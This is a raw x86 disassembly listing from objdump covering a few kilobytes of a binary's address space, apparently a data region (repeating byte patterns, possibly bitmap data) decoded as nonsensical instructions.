  4020a0:	42                   	inc    %edx
  4020a1:	42                   	inc    %edx
  4020a2:	42                   	inc    %edx
  4020a3:	42                   	inc    %edx
  4020a4:	42                   	inc    %edx
  4020a5:	3a 49 2b             	cmp    0x2b(%ecx),%cl
  4020a8:	2b 2b                	sub    (%ebx),%ebp
  4020aa:	2b 2b                	sub    (%ebx),%ebp
  4020ac:	2b 3f                	sub    (%edi),%edi
  4020ae:	47                   	inc    %edi
  4020af:	39 47 3c             	cmp    %eax,0x3c(%edi)
  4020b2:	30 30                	xor    %dh,(%eax)
  4020b4:	15 23 38 3f 2f       	adc    $0x2f3f3823,%eax
  4020b9:	3b 46 19             	cmp    0x19(%esi),%eax
	...
  4020c4:	19 46 3b             	sbb    %eax,0x3b(%esi)
  4020c7:	2f                   	das
  4020c8:	2f                   	das
  4020c9:	2f                   	das
  4020ca:	23 30                	and    (%eax),%esi
  4020cc:	30 30                	xor    %dh,(%eax)
  4020ce:	30 3a                	xor    %bh,(%edx)
  4020d0:	3a 39                	cmp    (%ecx),%bh
  4020d2:	3a 35 2c 2b 2b 48    	cmp    0x482b2b2c,%dh
  4020d8:	41                   	inc    %ecx
  4020d9:	42                   	inc    %edx
  4020da:	42                   	inc    %edx
  4020db:	42                   	inc    %edx
  4020dc:	42                   	inc    %edx
  4020dd:	42                   	inc    %edx
  4020de:	42                   	inc    %edx
  4020df:	42                   	inc    %edx
  4020e0:	42                   	inc    %edx
  4020e1:	41                   	inc    %ecx
  4020e2:	42                   	inc    %edx
  4020e3:	39 39                	cmp    %edi,(%ecx)
  4020e5:	3f                   	aas
  4020e6:	2b 2b                	sub    (%ebx),%ebp
  4020e8:	2b 2b                	sub    (%ebx),%ebp
  4020ea:	2b 2b                	sub    (%ebx),%ebp
  4020ec:	2b 2f                	sub    (%edi),%ebp
  4020ee:	30 39                	xor    %bh,(%ecx)
  4020f0:	3a 47 30             	cmp    0x30(%edi),%al
  4020f3:	3c 23                	cmp    $0x23,%al
  4020f5:	23 1b                	and    (%ebx),%ebx
  4020f7:	3f                   	aas
  4020f8:	2f                   	das
  4020f9:	3b 2f                	cmp    (%edi),%ebp
  4020fb:	32 00                	xor    (%eax),%al
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	00 00                	add    %al,(%eax)
  402101:	00 00                	add    %al,(%eax)
  402103:	00 19                	add    %bl,(%ecx)
  402105:	46                   	inc    %esi
  402106:	14 3b                	adc    $0x3b,%al
  402108:	3f                   	aas
  402109:	45                   	inc    %ebp
  40210a:	23 15 30 30 47 3a    	and    0x3a473030,%edx
  402110:	39 39                	cmp    %edi,(%ecx)
  402112:	39 39                	cmp    %edi,(%ecx)
  402114:	39 35 35 42 39 42    	cmp    %esi,0x42394235
  40211a:	42                   	inc    %edx
  40211b:	41                   	inc    %ecx
  40211c:	42                   	inc    %edx
  40211d:	42                   	inc    %edx
  40211e:	41                   	inc    %ecx
  40211f:	42                   	inc    %edx
  402120:	39 42 42             	cmp    %eax,0x42(%edx)
  402123:	45                   	inc    %ebp
  402124:	2c 2b                	sub    $0x2b,%al
  402126:	2b 2b                	sub    (%ebx),%ebp
  402128:	2b 2b                	sub    (%ebx),%ebp
  40212a:	2b 2b                	sub    (%ebx),%ebp
  40212c:	2b 45 3a             	sub    0x3a(%ebp),%eax
  40212f:	39 47 47             	cmp    %eax,0x47(%edi)
  402132:	30 30                	xor    %dh,(%eax)
  402134:	30 23                	xor    %ah,(%ebx)
  402136:	3c 3f                	cmp    $0x3f,%al
  402138:	2f                   	das
  402139:	14 46                	adc    $0x46,%al
  40213b:	19 00                	sbb    %eax,(%eax)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	00 00                	add    %al,(%eax)
  402141:	00 00                	add    %al,(%eax)
  402143:	00 19                	add    %bl,(%ecx)
  402145:	46                   	inc    %esi
  402146:	3b 2f                	cmp    (%edi),%ebp
  402148:	3f                   	aas
  402149:	45                   	inc    %ebp
  40214a:	06                   	push   %es
  40214b:	30 30                	xor    %dh,(%eax)
  40214d:	47                   	inc    %edi
  40214e:	30 3a                	xor    %bh,(%edx)
  402150:	39 39                	cmp    %edi,(%ecx)
  402152:	39 42 42             	cmp    %eax,0x42(%edx)
  402155:	39 39                	cmp    %edi,(%ecx)
  402157:	42                   	inc    %edx
  402158:	42                   	inc    %edx
  402159:	42                   	inc    %edx
  40215a:	42                   	inc    %edx
  40215b:	42                   	inc    %edx
  40215c:	39 42 41             	cmp    %eax,0x41(%edx)
  40215f:	1d 2f 49 2b 2b       	sbb    $0x2b2b492f,%eax
  402164:	2b 2b                	sub    (%ebx),%ebp
  402166:	2b 2b                	sub    (%ebx),%ebp
  402168:	2b 2b                	sub    (%ebx),%ebp
  40216a:	2b 2b                	sub    (%ebx),%ebp
  40216c:	2b 39                	sub    (%ecx),%edi
  40216e:	3a 39                	cmp    (%ecx),%bh
  402170:	39 47 30             	cmp    %eax,0x30(%edi)
  402173:	3c 30                	cmp    $0x30,%al
  402175:	23 30                	and    (%eax),%esi
  402177:	3f                   	aas
  402178:	2f                   	das
  402179:	3b 46 32             	cmp    0x32(%esi),%eax
	...
  402184:	32 46 14             	xor    0x14(%esi),%al
  402187:	2f                   	das
  402188:	3f                   	aas
  402189:	41                   	inc    %ecx
  40218a:	23 30                	and    (%eax),%esi
  40218c:	30 30                	xor    %dh,(%eax)
  40218e:	3a 3a                	cmp    (%edx),%bh
  402190:	39 39                	cmp    %edi,(%ecx)
  402192:	42                   	inc    %edx
  402193:	39 1b                	cmp    %ebx,(%ebx)
  402195:	42                   	inc    %edx
  402196:	42                   	inc    %edx
  402197:	1b 39                	sbb    (%ecx),%edi
  402199:	39 1b                	cmp    %ebx,(%ebx)
  40219b:	45                   	inc    %ebp
  40219c:	2f                   	das
  40219d:	2c 2b                	sub    $0x2b,%al
  40219f:	2b 2b                	sub    (%ebx),%ebp
  4021a1:	2b 2b                	sub    (%ebx),%ebp
  4021a3:	2b 2b                	sub    (%ebx),%ebp
  4021a5:	2b 2b                	sub    (%ebx),%ebp
  4021a7:	2b 2b                	sub    (%ebx),%ebp
  4021a9:	2b 2b                	sub    (%ebx),%ebp
  4021ab:	2b 1d 39 39 39 47    	sub    0x47393939,%ebx
  4021b1:	47                   	inc    %edi
  4021b2:	47                   	inc    %edi
  4021b3:	30 30                	xor    %dh,(%eax)
  4021b5:	23 30                	and    (%eax),%esi
  4021b7:	2f                   	das
  4021b8:	2f                   	das
  4021b9:	2f                   	das
  4021ba:	2f                   	das
  4021bb:	19 00                	sbb    %eax,(%eax)
  4021bd:	00 00                	add    %al,(%eax)
  4021bf:	00 00                	add    %al,(%eax)
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	00 19                	add    %bl,(%ecx)
  4021c5:	3b 2f                	cmp    (%edi),%ebp
  4021c7:	3b 3f                	cmp    (%edi),%edi
  4021c9:	41                   	inc    %ecx
  4021ca:	23 30                	and    (%eax),%esi
  4021cc:	30 47 30             	xor    %al,0x30(%edi)
  4021cf:	3a 39                	cmp    (%ecx),%bh
  4021d1:	39 42 42             	cmp    %eax,0x42(%edx)
  4021d4:	42                   	inc    %edx
  4021d5:	41                   	inc    %ecx
  4021d6:	42                   	inc    %edx
  4021d7:	42                   	inc    %edx
  4021d8:	45                   	inc    %ebp
  4021d9:	3f                   	aas
  4021da:	2b 2b                	sub    (%ebx),%ebp
  4021dc:	2b 2b                	sub    (%ebx),%ebp
  4021de:	2b 2b                	sub    (%ebx),%ebp
  4021e0:	2b 2b                	sub    (%ebx),%ebp
  4021e2:	2b 2b                	sub    (%ebx),%ebp
  4021e4:	2b 2b                	sub    (%ebx),%ebp
  4021e6:	2b 2b                	sub    (%ebx),%ebp
  4021e8:	2b 2b                	sub    (%ebx),%ebp
  4021ea:	2b 2f                	sub    (%edi),%ebp
  4021ec:	39 42 39             	cmp    %eax,0x39(%edx)
  4021ef:	39 39                	cmp    %edi,(%ecx)
  4021f1:	3a 30                	cmp    (%eax),%dh
  4021f3:	30 30                	xor    %dh,(%eax)
  4021f5:	23 15 2f 2f 3b 46    	and    0x463b2f2f,%edx
  4021fb:	19 00                	sbb    %eax,(%eax)
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	00 00                	add    %al,(%eax)
  402201:	00 00                	add    %al,(%eax)
  402203:	00 32                	add    %dh,(%edx)
  402205:	46                   	inc    %esi
  402206:	14 2f                	adc    $0x2f,%al
  402208:	3f                   	aas
  402209:	41                   	inc    %ecx
  40220a:	23 23                	and    (%ebx),%esp
  40220c:	30 47 39             	xor    %al,0x39(%edi)
  40220f:	39 42 1b             	cmp    %eax,0x1b(%edx)
  402212:	41                   	inc    %ecx
  402213:	41                   	inc    %ecx
  402214:	42                   	inc    %edx
  402215:	42                   	inc    %edx
  402216:	35 49 2b 2b 2b       	xor    $0x2b2b2b49,%eax
  40221b:	2b 2b                	sub    (%ebx),%ebp
  40221d:	2b 2b                	sub    (%ebx),%ebp
  40221f:	2b 2b                	sub    (%ebx),%ebp
  402221:	2b 2b                	sub    (%ebx),%ebp
  402223:	2b 2b                	sub    (%ebx),%ebp
  402225:	2b 2b                	sub    (%ebx),%ebp
  402227:	2b 2b                	sub    (%ebx),%ebp
  402229:	2b 2f                	sub    (%edi),%ebp
  40222b:	1b 41 42             	sbb    0x42(%ecx),%eax
  40222e:	1b 42 3a             	sbb    0x3a(%edx),%eax
  402231:	39 3c 30             	cmp    %edi,(%eax,%esi,1)
  402234:	30 23                	xor    %ah,(%ebx)
  402236:	30 2f                	xor    %ch,(%edi)
  402238:	2f                   	das
  402239:	2f                   	das
  40223a:	46                   	inc    %esi
  40223b:	19 00                	sbb    %eax,(%eax)
  40223d:	00 00                	add    %al,(%eax)
  40223f:	00 00                	add    %al,(%eax)
  402241:	00 00                	add    %al,(%eax)
  402243:	00 19                	add    %bl,(%ecx)
  402245:	46                   	inc    %esi
  402246:	2f                   	das
  402247:	14 3f                	adc    $0x3f,%al
  402249:	35 23 3c 3a 3a       	xor    $0x3a3a3c23,%eax
  40224e:	39 42 1b             	cmp    %eax,0x1b(%edx)
  402251:	42                   	inc    %edx
  402252:	42                   	inc    %edx
  402253:	42                   	inc    %edx
  402254:	42                   	inc    %edx
  402255:	1d 2b 2b 2b 2b       	sbb    $0x2b2b2b2b,%eax
  40225a:	2b 2b                	sub    (%ebx),%ebp
  40225c:	2b 2b                	sub    (%ebx),%ebp
  40225e:	2b 2b                	sub    (%ebx),%ebp
  402260:	2b 2b                	sub    (%ebx),%ebp
  402262:	2b 2b                	sub    (%ebx),%ebp
  402264:	2b 2b                	sub    (%ebx),%ebp
  402266:	2b 2b                	sub    (%ebx),%ebp
  402268:	3f                   	aas
  402269:	35 42 35 42 41       	xor    $0x41423542,%eax
  40226e:	41                   	inc    %ecx
  40226f:	38 42 38             	cmp    %al,0x38(%edx)
  402272:	38 3a                	cmp    %bh,(%edx)
  402274:	3c 30                	cmp    $0x30,%al
  402276:	15 2f 2f 14 46       	adc    $0x46142f2f,%eax
  40227b:	32 00                	xor    (%eax),%al
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 00                	add    %al,(%eax)
  402281:	00 00                	add    %al,(%eax)
  402283:	00 19                	add    %bl,(%ecx)
  402285:	46                   	inc    %esi
  402286:	3b 2f                	cmp    (%edi),%ebp
  402288:	3f                   	aas
  402289:	14 30                	adc    $0x30,%al
  40228b:	3a 38                	cmp    (%eax),%bh
  40228d:	38 38                	cmp    %bh,(%eax)
  40228f:	38 1b                	cmp    %bl,(%ebx)
  402291:	41                   	inc    %ecx
  402292:	42                   	inc    %edx
  402293:	41                   	inc    %ecx
  402294:	35 2b 2b 2b 2b       	xor    $0x2b2b2b2b,%eax
  402299:	2b 2b                	sub    (%ebx),%ebp
  40229b:	2b 2b                	sub    (%ebx),%ebp
  40229d:	2b 2b                	sub    (%ebx),%ebp
  40229f:	2b 2b                	sub    (%ebx),%ebp
  4022a1:	2b 2b                	sub    (%ebx),%ebp
  4022a3:	2b 2b                	sub    (%ebx),%ebp
  4022a5:	48                   	dec    %eax
  4022a6:	14 35                	adc    $0x35,%al
  4022a8:	42                   	inc    %edx
  4022a9:	41                   	inc    %ecx
  4022aa:	42                   	inc    %edx
  4022ab:	35 41 42 41 42       	xor    $0x42414241,%eax
  4022b0:	42                   	inc    %edx
  4022b1:	39 3a                	cmp    %edi,(%edx)
  4022b3:	3a 3a                	cmp    (%edx),%bh
  4022b5:	3c 38                	cmp    $0x38,%al
  4022b7:	3f                   	aas
  4022b8:	2f                   	das
  4022b9:	3b 46 19             	cmp    0x19(%esi),%eax
	...
  4022c4:	19 46 2f             	sbb    %eax,0x2f(%esi)
  4022c7:	2f                   	das
  4022c8:	3f                   	aas
  4022c9:	2f                   	das
  4022ca:	3c 3a                	cmp    $0x3a,%al
  4022cc:	3a 3a                	cmp    (%edx),%bh
  4022ce:	42                   	inc    %edx
  4022cf:	1b 41 42             	sbb    0x42(%ecx),%eax
  4022d2:	42                   	inc    %edx
  4022d3:	41                   	inc    %ecx
  4022d4:	2c 2b                	sub    $0x2b,%al
  4022d6:	2b 2b                	sub    (%ebx),%ebp
  4022d8:	2b 2b                	sub    (%ebx),%ebp
  4022da:	2b 2b                	sub    (%ebx),%ebp
  4022dc:	2b 2b                	sub    (%ebx),%ebp
  4022de:	2b 2b                	sub    (%ebx),%ebp
  4022e0:	2b 49 3f             	sub    0x3f(%ecx),%ecx
  4022e3:	1d 35 41 41 35       	sbb    $0x35414135,%eax
  4022e8:	41                   	inc    %ecx
  4022e9:	35 35 42 35 35       	xor    $0x35354235,%eax
  4022ee:	42                   	inc    %edx
  4022ef:	1b 38                	sbb    (%eax),%edi
  4022f1:	1b 38                	sbb    (%eax),%edi
  4022f3:	38 39                	cmp    %bh,(%ecx)
  4022f5:	3c 41                	cmp    $0x41,%al
  4022f7:	49                   	dec    %ecx
  4022f8:	2f                   	das
  4022f9:	2f                   	das
  4022fa:	46                   	inc    %esi
  4022fb:	19 00                	sbb    %eax,(%eax)
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	00 00                	add    %al,(%eax)
  402301:	00 00                	add    %al,(%eax)
  402303:	00 32                	add    %dh,(%edx)
  402305:	46                   	inc    %esi
  402306:	2f                   	das
  402307:	3f                   	aas
  402308:	3f                   	aas
  402309:	2f                   	das
  40230a:	3a 38                	cmp    (%eax),%bh
  40230c:	38 38                	cmp    %bh,(%eax)
  40230e:	38 1b                	cmp    %bl,(%ebx)
  402310:	42                   	inc    %edx
  402311:	41                   	inc    %ecx
  402312:	41                   	inc    %ecx
  402313:	1d 2b 2b 2b 2b       	sbb    $0x2b2b2b2b,%eax
  402318:	2b 2b                	sub    (%ebx),%ebp
  40231a:	2b 2b                	sub    (%ebx),%ebp
  40231c:	2b 48 2f             	sub    0x2f(%eax),%ecx
  40231f:	14 35                	adc    $0x35,%al
  402321:	41                   	inc    %ecx
  402322:	41                   	inc    %ecx
  402323:	41                   	inc    %ecx
  402324:	35 35 35 41 35       	xor    $0x35413535,%eax
  402329:	41                   	inc    %ecx
  40232a:	41                   	inc    %ecx
  40232b:	35 41 42 41 41       	xor    $0x41414241,%eax
  402330:	42                   	inc    %edx
  402331:	38 38                	cmp    %bh,(%eax)
  402333:	3a 38                	cmp    (%eax),%bh
  402335:	3c 45                	cmp    $0x45,%al
  402337:	3f                   	aas
  402338:	3f                   	aas
  402339:	2f                   	das
  40233a:	46                   	inc    %esi
  40233b:	32 00                	xor    (%eax),%al
  40233d:	00 00                	add    %al,(%eax)
  40233f:	00 00                	add    %al,(%eax)
  402341:	00 00                	add    %al,(%eax)
  402343:	00 32                	add    %dh,(%edx)
  402345:	3f                   	aas
  402346:	2f                   	das
  402347:	2f                   	das
  402348:	49                   	dec    %ecx
  402349:	35 3c 38 38 38       	xor    $0x3838383c,%eax
  40234e:	1b 42 41             	sbb    0x41(%edx),%eax
  402351:	42                   	inc    %edx
  402352:	1b 3f                	sbb    (%edi),%edi
  402354:	2b 2b                	sub    (%ebx),%ebp
  402356:	2b 2b                	sub    (%ebx),%ebp
  402358:	2b 2b                	sub    (%ebx),%ebp
  40235a:	2b 49 35             	sub    0x35(%ecx),%ecx
  40235d:	35 41 35 35 35       	xor    $0x35353541,%eax
  402362:	1d 35 35 41 35       	sbb    $0x35413535,%eax
  402367:	3f                   	aas
  402368:	2b 2c 2f             	sub    (%edi,%ebp,1),%ebp
  40236b:	41                   	inc    %ecx
  40236c:	35 35 42 41 1b       	xor    $0x1b414235,%eax
  402371:	1b 1b                	sbb    (%ebx),%ebx
  402373:	38 3a                	cmp    %bh,(%edx)
  402375:	3a 2f                	cmp    (%edi),%ch
  402377:	3f                   	aas
  402378:	2f                   	das
  402379:	46                   	inc    %esi
  40237a:	3f                   	aas
  40237b:	32 00                	xor    (%eax),%al
  40237d:	00 00                	add    %al,(%eax)
  40237f:	00 00                	add    %al,(%eax)
  402381:	00 00                	add    %al,(%eax)
  402383:	00 32                	add    %dh,(%edx)
  402385:	3f                   	aas
  402386:	46                   	inc    %esi
  402387:	3f                   	aas
  402388:	3f                   	aas
  402389:	3a 3a                	cmp    (%edx),%bh
  40238b:	38 38                	cmp    %bh,(%eax)
  40238d:	1b 1b                	sbb    (%ebx),%ebx
  40238f:	1b 41 42             	sbb    0x42(%ecx),%eax
  402392:	41                   	inc    %ecx
  402393:	3f                   	aas
  402394:	2b 2b                	sub    (%ebx),%ebp
  402396:	2b 2b                	sub    (%ebx),%ebp
  402398:	2b 2b                	sub    (%ebx),%ebp
  40239a:	49                   	dec    %ecx
  40239b:	41                   	inc    %ecx
  40239c:	35 35 45 1d 35       	xor    $0x351d4535,%eax
  4023a1:	45                   	inc    %ebp
  4023a2:	35 45 1d 41 49       	xor    $0x49411d45,%eax
  4023a7:	2b 2b                	sub    (%ebx),%ebp
  4023a9:	2b 2b                	sub    (%ebx),%ebp
  4023ab:	49                   	dec    %ecx
  4023ac:	42                   	inc    %edx
  4023ad:	41                   	inc    %ecx
  4023ae:	35 42 1b 42 38       	xor    $0x38421b42,%eax
  4023b3:	38 38                	cmp    %bh,(%eax)
  4023b5:	38 3f                	cmp    %bh,(%edi)
  4023b7:	3f                   	aas
  4023b8:	3f                   	aas
  4023b9:	2f                   	das
  4023ba:	3f                   	aas
  4023bb:	32 00                	xor    (%eax),%al
  4023bd:	00 00                	add    %al,(%eax)
  4023bf:	00 00                	add    %al,(%eax)
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	00 32                	add    %dh,(%edx)
  4023c5:	3f                   	aas
  4023c6:	3f                   	aas
  4023c7:	3f                   	aas
  4023c8:	14 3c                	adc    $0x3c,%al
  4023ca:	38 38                	cmp    %bh,(%eax)
  4023cc:	38 1b                	cmp    %bl,(%ebx)
  4023ce:	1b 42 41             	sbb    0x41(%edx),%eax
  4023d1:	41                   	inc    %ecx
  4023d2:	41                   	inc    %ecx
  4023d3:	49                   	dec    %ecx
  4023d4:	2b 2b                	sub    (%ebx),%ebp
  4023d6:	2b 2b                	sub    (%ebx),%ebp
  4023d8:	2b 2b                	sub    (%ebx),%ebp
  4023da:	45                   	inc    %ebp
  4023db:	35 35 1d 45 35       	xor    $0x35451d35,%eax
  4023e0:	45                   	inc    %ebp
  4023e1:	1d 35 1d 41 2f       	sbb    $0x2f411d35,%eax
  4023e6:	2b 2b                	sub    (%ebx),%ebp
  4023e8:	2b 2b                	sub    (%ebx),%ebp
  4023ea:	2b 2b                	sub    (%ebx),%ebp
  4023ec:	45                   	inc    %ebp
  4023ed:	41                   	inc    %ecx
  4023ee:	41                   	inc    %ecx
  4023ef:	41                   	inc    %ecx
  4023f0:	41                   	inc    %ecx
  4023f1:	1b 1b                	sbb    (%ebx),%ebx
  4023f3:	1b 3a                	sbb    (%edx),%edi
  4023f5:	45                   	inc    %ebp
  4023f6:	49                   	dec    %ecx
  4023f7:	3f                   	aas
  4023f8:	3f                   	aas
  4023f9:	46                   	inc    %esi
  4023fa:	3f                   	aas
  4023fb:	32 00                	xor    (%eax),%al
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	00 00                	add    %al,(%eax)
  402403:	00 33                	add    %dh,(%ebx)
  402405:	3f                   	aas
  402406:	46                   	inc    %esi
  402407:	49                   	dec    %ecx
  402408:	45                   	inc    %ebp
  402409:	3a 1b                	cmp    (%ebx),%bl
  40240b:	38 1b                	cmp    %bl,(%ebx)
  40240d:	1b 1b                	sbb    (%ebx),%ebx
  40240f:	41                   	inc    %ecx
  402410:	41                   	inc    %ecx
  402411:	35 1b 3f 2b 2b       	xor    $0x2b2b3f1b,%eax
  402416:	2b 2b                	sub    (%ebx),%ebp
  402418:	2b 2b                	sub    (%ebx),%ebp
  40241a:	2f                   	das
  40241b:	41                   	inc    %ecx
  40241c:	45                   	inc    %ebp
  40241d:	1d 45 1d 45 1d       	sbb    $0x1d451d45,%eax
  402422:	45                   	inc    %ebp
  402423:	35 45 2b 2b 2b       	xor    $0x2b2b2b45,%eax
  402428:	2b 2b                	sub    (%ebx),%ebp
  40242a:	2b 2b                	sub    (%ebx),%ebp
  40242c:	14 41                	adc    $0x41,%al
  40242e:	42                   	inc    %edx
  40242f:	41                   	inc    %ecx
  402430:	41                   	inc    %ecx
  402431:	1b 1b                	sbb    (%ebx),%ebx
  402433:	1b 38                	sbb    (%eax),%edi
  402435:	2f                   	das
  402436:	49                   	dec    %ecx
  402437:	3f                   	aas
  402438:	3f                   	aas
  402439:	2f                   	das
  40243a:	48                   	dec    %eax
  40243b:	32 00                	xor    (%eax),%al
  40243d:	00 00                	add    %al,(%eax)
  40243f:	00 00                	add    %al,(%eax)
  402441:	00 00                	add    %al,(%eax)
  402443:	00 32                	add    %dh,(%edx)
  402445:	48                   	dec    %eax
  402446:	3f                   	aas
  402447:	3f                   	aas
  402448:	41                   	inc    %ecx
  402449:	3a 1b                	cmp    (%ebx),%bl
  40244b:	1b 1b                	sbb    (%ebx),%ebx
  40244d:	1b 1b                	sbb    (%ebx),%ebx
  40244f:	41                   	inc    %ecx
  402450:	41                   	inc    %ecx
  402451:	41                   	inc    %ecx
  402452:	42                   	inc    %edx
  402453:	2f                   	das
  402454:	2b 2b                	sub    (%ebx),%ebp
  402456:	2b 2b                	sub    (%ebx),%ebp
  402458:	2b 2b                	sub    (%ebx),%ebp
  40245a:	2b 1d 35 35 35 45    	sub    0x45353535,%ebx
  402460:	35 35 35 35 2c       	xor    $0x2c353535,%eax
  402465:	2b 2b                	sub    (%ebx),%ebp
  402467:	2b 2b                	sub    (%ebx),%ebp
  402469:	2b 2b                	sub    (%ebx),%ebp
  40246b:	2b 35 41 35 41 41    	sub    0x41413541,%esi
  402471:	1b 41 38             	sbb    0x38(%ecx),%eax
  402474:	35 49 3f 3f 3f       	xor    $0x3f3f3f49,%eax
  402479:	46                   	inc    %esi
  40247a:	3f                   	aas
  40247b:	32 00                	xor    (%eax),%al
  40247d:	00 00                	add    %al,(%eax)
  40247f:	00 00                	add    %al,(%eax)
  402481:	00 00                	add    %al,(%eax)
  402483:	00 32                	add    %dh,(%edx)
  402485:	48                   	dec    %eax
  402486:	2f                   	das
  402487:	49                   	dec    %ecx
  402488:	41                   	inc    %ecx
  402489:	1b 1b                	sbb    (%ebx),%ebx
  40248b:	1b 1b                	sbb    (%ebx),%ebx
  40248d:	41                   	inc    %ecx
  40248e:	41                   	inc    %ecx
  40248f:	41                   	inc    %ecx
  402490:	41                   	inc    %ecx
  402491:	41                   	inc    %ecx
  402492:	35 35 2b 2b 2b       	xor    $0x2b2b2b35,%eax
  402497:	2b 2b                	sub    (%ebx),%ebp
  402499:	2b 2b                	sub    (%ebx),%ebp
  40249b:	2b 49 14             	sub    0x14(%ecx),%ecx
  40249e:	14 1d                	adc    $0x1d,%al
  4024a0:	14 14                	adc    $0x14,%al
  4024a2:	2f                   	das
  4024a3:	2b 2b                	sub    (%ebx),%ebp
  4024a5:	2b 2b                	sub    (%ebx),%ebp
  4024a7:	2b 2b                	sub    (%ebx),%ebp
  4024a9:	2b 2b                	sub    (%ebx),%ebp
  4024ab:	2c 41                	sub    $0x41,%al
  4024ad:	35 41 41 41 41       	xor    $0x41414141,%eax
  4024b2:	41                   	inc    %ecx
  4024b3:	38 18                	cmp    %bl,(%eax)
  4024b5:	49                   	dec    %ecx
  4024b6:	3f                   	aas
  4024b7:	3f                   	aas
  4024b8:	3f                   	aas
  4024b9:	3f                   	aas
  4024ba:	3f                   	aas
  4024bb:	33 00                	xor    (%eax),%eax
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	00 00                	add    %al,(%eax)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	00 33                	add    %dh,(%ebx)
  4024c5:	3f                   	aas
  4024c6:	3f                   	aas
  4024c7:	3f                   	aas
  4024c8:	35 1b 1b 1b 1b       	xor    $0x1b1b1b1b,%eax
  4024cd:	41                   	inc    %ecx
  4024ce:	41                   	inc    %ecx
  4024cf:	41                   	inc    %ecx
  4024d0:	41                   	inc    %ecx
  4024d1:	35 35 41 2f 2b       	xor    $0x2b2f4135,%eax
  4024d6:	2b 2b                	sub    (%ebx),%ebp
  4024d8:	2b 2b                	sub    (%ebx),%ebp
  4024da:	2b 2b                	sub    (%ebx),%ebp
  4024dc:	2b 2b                	sub    (%ebx),%ebp
  4024de:	2b 2b                	sub    (%ebx),%ebp
  4024e0:	2b 2b                	sub    (%ebx),%ebp
  4024e2:	2b 2b                	sub    (%ebx),%ebp
  4024e4:	2b 2b                	sub    (%ebx),%ebp
  4024e6:	2b 2b                	sub    (%ebx),%ebp
  4024e8:	2b 2b                	sub    (%ebx),%ebp
  4024ea:	2b 45 35             	sub    0x35(%ebp),%eax
  4024ed:	35 35 35 41 41       	xor    $0x41413535,%eax
  4024f2:	1b 45 49             	sbb    0x49(%ebp),%eax
  4024f5:	3f                   	aas
  4024f6:	3f                   	aas
  4024f7:	3f                   	aas
  4024f8:	3f                   	aas
  4024f9:	2f                   	das
  4024fa:	48                   	dec    %eax
  4024fb:	32 00                	xor    (%eax),%al
  4024fd:	00 00                	add    %al,(%eax)
  4024ff:	00 00                	add    %al,(%eax)
  402501:	00 00                	add    %al,(%eax)
  402503:	00 33                	add    %dh,(%ebx)
  402505:	3f                   	aas
  402506:	3f                   	aas
  402507:	49                   	dec    %ecx
  402508:	45                   	inc    %ebp
  402509:	1b 1b                	sbb    (%ebx),%ebx
  40250b:	41                   	inc    %ecx
  40250c:	41                   	inc    %ecx
  40250d:	41                   	inc    %ecx
  40250e:	41                   	inc    %ecx
  40250f:	35 35 41 45 35       	xor    $0x35454135,%eax
  402514:	41                   	inc    %ecx
  402515:	3f                   	aas
  402516:	2b 2b                	sub    (%ebx),%ebp
  402518:	2b 2b                	sub    (%ebx),%ebp
  40251a:	2b 2b                	sub    (%ebx),%ebp
  40251c:	2b 2b                	sub    (%ebx),%ebp
  40251e:	2b 2b                	sub    (%ebx),%ebp
  402520:	2b 2b                	sub    (%ebx),%ebp
  402522:	2b 2b                	sub    (%ebx),%ebp
  402524:	2b 2b                	sub    (%ebx),%ebp
  402526:	2b 2b                	sub    (%ebx),%ebp
  402528:	2b 2b                	sub    (%ebx),%ebp
  40252a:	2f                   	das
  40252b:	41                   	inc    %ecx
  40252c:	45                   	inc    %ebp
  40252d:	35 35 41 35 41       	xor    $0x41354135,%eax
  402532:	35 49 49 49 3f       	xor    $0x3f494949,%eax
  402537:	3f                   	aas
  402538:	3f                   	aas
  402539:	3f                   	aas
  40253a:	3f                   	aas
  40253b:	33 00                	xor    (%eax),%eax
  40253d:	00 00                	add    %al,(%eax)
  40253f:	00 00                	add    %al,(%eax)
  402541:	00 00                	add    %al,(%eax)
  402543:	00 33                	add    %dh,(%ebx)
  402545:	48                   	dec    %eax
  402546:	3f                   	aas
  402547:	49                   	dec    %ecx
  402548:	45                   	inc    %ebp
  402549:	1b 41 41             	sbb    0x41(%ecx),%eax
  40254c:	41                   	inc    %ecx
  40254d:	41                   	inc    %ecx
  40254e:	41                   	inc    %ecx
  40254f:	41                   	inc    %ecx
  402550:	41                   	inc    %ecx
  402551:	45                   	inc    %ebp
  402552:	41                   	inc    %ecx
  402553:	35 45 35 3f 2b       	xor    $0x2b3f3545,%eax
  402558:	2b 2b                	sub    (%ebx),%ebp
  40255a:	2b 2b                	sub    (%ebx),%ebp
  40255c:	2b 2b                	sub    (%ebx),%ebp
  40255e:	2b 2b                	sub    (%ebx),%ebp
  402560:	2b 2b                	sub    (%ebx),%ebp
  402562:	2b 2b                	sub    (%ebx),%ebp
  402564:	2b 2b                	sub    (%ebx),%ebp
  402566:	2b 2b                	sub    (%ebx),%ebp
  402568:	2b 14 35 45 35 45 41 	sub    0x41453545(,%esi,1),%edx
  40256f:	45                   	inc    %ebp
  402570:	41                   	inc    %ecx
  402571:	41                   	inc    %ecx
  402572:	3f                   	aas
  402573:	49                   	dec    %ecx
  402574:	49                   	dec    %ecx
  402575:	3f                   	aas
  402576:	49                   	dec    %ecx
  402577:	3f                   	aas
  402578:	3f                   	aas
  402579:	3f                   	aas
  40257a:	3f                   	aas
  40257b:	33 00                	xor    (%eax),%eax
  40257d:	00 00                	add    %al,(%eax)
  40257f:	00 00                	add    %al,(%eax)
  402581:	00 00                	add    %al,(%eax)
  402583:	00 33                	add    %dh,(%ebx)
  402585:	3f                   	aas
  402586:	3f                   	aas
  402587:	49                   	dec    %ecx
  402588:	2f                   	das
  402589:	41                   	inc    %ecx
  40258a:	45                   	inc    %ebp
  40258b:	41                   	inc    %ecx
  40258c:	41                   	inc    %ecx
  40258d:	45                   	inc    %ebp
  40258e:	41                   	inc    %ecx
  40258f:	45                   	inc    %ebp
  402590:	41                   	inc    %ecx
  402591:	45                   	inc    %ebp
